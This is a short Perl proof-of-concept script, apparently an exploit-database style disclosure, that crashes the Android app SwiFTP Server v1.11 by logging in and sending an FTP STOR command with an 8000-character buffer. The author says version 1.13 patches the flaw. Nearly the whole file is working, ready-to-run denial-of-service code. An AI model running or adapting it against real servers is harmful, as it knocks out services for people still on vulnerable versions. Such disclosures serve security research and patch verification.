#!/usr/bin/perl
############
#
# Simple Dos Crap for the Android app : SwiFTP Server v1.11
#  by Julien Bedard
#
# This DoS have been patched in the new version that's why
# I'm releasing it. 
#
# SwiFTP Server v1.11 --> Vulnerable
# SwiFTP Server v1.13 --> Patched
#
####################################

use IO::Socket::INET;

$overflow = 'A' x 8000;

$ftpraw=IO::Socket::INET->new("192.168.2.13:2121") or die;

print $ftpraw "user nouser\n";
print $ftpraw "pass nopass\n";
print $ftpraw "stor $overflow\n";
print $ftpraw "QUIT\n";

close $ftpraw;

